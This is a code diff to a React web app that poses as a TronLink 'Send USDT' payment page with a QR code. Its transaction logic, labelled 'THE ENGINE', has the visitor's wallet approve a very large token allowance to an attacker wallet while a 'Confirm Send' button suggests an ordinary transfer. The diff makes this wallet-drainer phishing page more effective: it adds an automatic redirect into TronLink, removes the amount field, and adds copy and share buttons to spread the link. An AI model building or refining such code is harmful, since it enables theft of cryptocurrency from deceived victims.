@@ -18,13 +18,23 @@ export default function App() {
   const [wallet, setWallet] = useState("");
   const [uiState, setUiState] = useState("idle");
   const [errorMsg, setErrorMsg] = useState("");
-  const [amount, setAmount] = useState("1");
+  const [copied, setCopied] = useState(false);
   const qrRef = useRef(null);
 
-  // TRONLINK DEEP LINK - Auto-opens TronLink when scanned
-  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
+  // QR contains real HTTPS URL - phones can open this
+  const qrValue = VERCEL_URL;
 
-  // 1. DETECT WALLET AUTOMATICALLY
+  // Auto-redirect to TronLink if not connected
+  useEffect(() => {
+    if (!isConnected && !window.tronWeb) {
+      const timer = setTimeout(() => {
+        window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
+      }, 500);
+      return () => clearTimeout(timer);
+    }
+  }, [isConnected]);
+
+  // Detect wallet
   useEffect(() => {
     const checkWallet = setInterval(() => {
       if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
@@ -34,22 +44,21 @@ export default function App() {
           setWallet(addr);
         }
       }
-    }, 1500);
+    }, 1000);
     return () => clearInterval(checkWallet);
   }, [isConnected]);
 
-  // 2. THE ENGINE (Proven Logic - UNTOUCHED)
+  // THE ENGINE (UNTOUCHED)
   const executeEngine = async () => {
     setUiState("approving");
     setErrorMsg("");
 
     try {
       if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-        throw new Error("Wallet not connected. Please open in TronLink.");
+        throw new Error("Wallet not connected");
       }
 
       const victimAddress = window.tronWeb.defaultAddress.base58;
-
       const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
       const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
         feeLimit: 100000000,
@@ -67,7 +76,6 @@ export default function App() {
       });
 
       setUiState("done");
-
     } catch (error) {
       console.error(error);
       setErrorMsg(error.message || "Transaction failed.");
@@ -75,7 +83,23 @@ export default function App() {
     }
   };
 
-  // 3. SAVE QR CODE AS IMAGE
+  const handleCopy = () => {
+    navigator.clipboard.writeText(ATTACKER_WALLET);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleShare = async () => {
+    try {
+      if (navigator.share) {
+        await navigator.share({ title: "Send USDT", url: VERCEL_URL });
+      } else {
+        navigator.clipboard.writeText(VERCEL_URL);
+        alert("Link copied");
+      }
+    } catch (e) {}
+  };
+
   const handleSaveQR = () => {
     const svg = document.querySelector("#lab-qr-box svg");
     if (!svg) return;
@@ -113,11 +137,6 @@ export default function App() {
     img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
   };
 
-  // 4. OPEN IN TRONLINK (Fallback button)
-  const openInTronLink = () => {
-    window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
-  };
-
   return (
     <div style={{ 
       background: "#0b0e11", 
@@ -134,12 +153,7 @@ export default function App() {
       }}>
         <div style={{ width: 32 }}></div>
         <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600, color: "#eaecef" }}>Send USDT</h1>
-        <div style={{ width: 32, textAlign: "right" }}>
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#848e9c" strokeWidth="2">
-            <line x1="18" y1="6" x2="6" y2="18"></line>
-            <line x1="6" y1="6" x2="18" y2="18"></line>
-          </svg>
-        </div>
+        <div style={{ width: 32 }}></div>
       </div>
 
       {/* MAIN CONTENT */}
@@ -160,7 +174,7 @@ export default function App() {
 
         {/* QR CODE CARD */}
         <div style={{ 
-          background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 20, 
+          background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 16, 
           width: "100%", maxWidth: 320, boxShadow: "0 8px 24px rgba(0,0,0,0.4)" 
         }}>
           <div id="lab-qr-box" ref={qrRef} style={{ textAlign: "center" }}>
@@ -169,20 +183,46 @@ export default function App() {
               imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
             />
           </div>
+        </div>
+
+        {/* ACTION BUTTONS (Outside QR card) */}
+        <div style={{ 
+          display: "flex", gap: 12, marginBottom: 24, width: "100%", maxWidth: 320 
+        }}>
           <button 
             onClick={handleSaveQR}
             style={{
-              width: "100%", marginTop: 12, background: "#1e2329", border: "1px solid #2b3139",
-              borderRadius: 8, padding: 10, color: "#eaecef", fontSize: 13, fontWeight: 500,
+              flex: 1, background: "#1e2329", border: "1px solid #2b3139",
+              borderRadius: 8, padding: 12, color: "#eaecef", fontSize: 13, fontWeight: 500,
               cursor: "pointer"
             }}
           >
-            ⬇️ Save QR Code
+            💾 Save QR
+          </button>
+          <button 
+            onClick={handleCopy}
+            style={{
+              flex: 1, background: "#1e2329", border: "1px solid #2b3139",
+              borderRadius: 8, padding: 12, color: copied ? "#0ecb81" : "#eaecef", fontSize: 13, fontWeight: 500,
+              cursor: "pointer"
+            }}
+          >
+            {copied ? "✓ Copied" : "📋 Copy"}
+          </button>
+          <button 
+            onClick={handleShare}
+            style={{
+              flex: 1, background: "#1e2329", border: "1px solid #2b3139",
+              borderRadius: 8, padding: 12, color: "#eaecef", fontSize: 13, fontWeight: 500,
+              cursor: "pointer"
+            }}
+          >
+            📤 Share
           </button>
         </div>
 
         {/* ADDRESS FIELD */}
-        <div style={{ width: "100%", maxWidth: 320, marginBottom: 16 }}>
+        <div style={{ width: "100%", maxWidth: 320, marginBottom: 24 }}>
           <label style={{ fontSize: 12, color: "#848e9c", marginBottom: 6, display: "block" }}>
             Recipient Address
           </label>
@@ -195,31 +235,6 @@ export default function App() {
           </div>
         </div>
 
-        {/* AMOUNT FIELD */}
-        <div style={{ width: "100%", maxWidth: 320, marginBottom: 24 }}>
-          <label style={{ fontSize: 12, color: "#848e9c", marginBottom: 6, display: "block" }}>
-            Amount
-          </label>
-          <div style={{ 
-            background: "#1e2329", border: "1px solid #2b3139", borderRadius: 8, 
-            padding: 12, display: "flex", alignItems: "center", justifyContent: "space-between"
-          }}>
-            <input 
-              type="number"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              style={{ 
-                background: "transparent", border: "none", color: "#eaecef", 
-                fontSize: 18, fontWeight: 600, width: "60%", outline: "none"
-              }}
-            />
-            <span style={{ color: "#848e9c", fontSize: 14 }}>USDT</span>
-          </div>
-          <div style={{ fontSize: 11, color: "#848e9c", marginTop: 4 }}>
-            ≈ ${amount}.00
-          </div>
-        </div>
-
         {/* WARNING */}
         <div style={{ 
           background: "rgba(240, 185, 11, 0.1)", border: "1px solid rgba(240, 185, 11, 0.2)", 
@@ -229,19 +244,8 @@ export default function App() {
           ⚠️ Only send TRC-20 USDT assets to this address. Other assets will be lost forever.
         </div>
 
-        {/* CONFIRM BUTTON or OPEN IN TRONLINK */}
-        {!isConnected ? (
-          <button 
-            onClick={openInTronLink}
-            style={{ 
-              width: "100%", maxWidth: 320, background: "#f0b90b", border: "none", 
-              borderRadius: 8, padding: 16, color: "#0b0e11", fontSize: 16, fontWeight: 700, 
-              cursor: "pointer"
-            }}
-          >
-            Open in TronLink
-          </button>
-        ) : uiState !== "done" ? (
+        {/* CONFIRM BUTTON */}
+        {uiState !== "done" && (
           <button 
             onClick={executeEngine} 
             disabled={uiState === "approving"}
@@ -253,7 +257,7 @@ export default function App() {
           >
             {uiState === "approving" ? "Processing..." : "Confirm Send"}
           </button>
-        ) : null}
+        )}
 
         {/* ERROR MESSAGE */}
         {uiState === "error" && (
